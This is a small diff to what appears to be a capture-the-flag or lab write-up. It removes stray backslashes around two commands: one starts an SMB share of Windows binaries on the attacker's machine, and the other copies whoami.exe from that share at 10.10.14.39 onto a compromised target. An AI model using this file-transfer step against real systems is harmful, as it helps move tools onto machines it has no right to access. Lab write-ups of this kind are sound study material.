@@ -95,9 +95,7 @@ In order to transfer this binary, I created a smb share:\
 ```bash
 smbserver.py a /usr/share/windows-resources/binaries/ 
 ```
-\
 And downloaded the file in the target machine:
-\
 ```bash
 copy '\\\10.10.14.39\a\whoami.exe'
 ```
